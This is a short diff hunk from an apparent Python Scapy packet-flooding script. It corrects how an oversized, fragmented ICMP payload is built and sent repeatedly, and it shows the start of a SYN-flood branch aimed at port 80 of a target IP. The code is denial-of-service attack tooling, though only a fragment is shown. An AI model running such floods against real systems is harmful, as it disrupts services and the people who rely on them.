@@ -169,7 +169,8 @@ if args.ip:
 	
 
 	if args.icmp:
-		send(numPackets*(fragment(ip_layer/ICMP()/args.icmp*60000)))
+		p = fragment(ip_layer/ICMP()/(args.icmp*60000))
+		send(numPackets*p)
 
 	elif args.syn:
 		tcp=TCP(sport=RandShort(), dport=80, flags="S")
